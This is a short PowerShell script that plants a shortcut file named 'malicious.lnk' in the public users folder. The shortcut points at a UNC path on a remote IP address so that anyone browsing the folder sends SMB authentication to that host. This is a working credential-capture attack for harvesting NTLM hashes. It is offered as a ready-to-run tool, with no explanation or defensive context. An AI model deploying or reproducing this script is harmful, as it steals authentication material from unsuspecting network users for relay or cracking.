$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("c:\users\public\malicious.lnk")
$lnk.TargetPath = "\\172.26.3.150\@malicious.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing the share triggers SMB auth."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
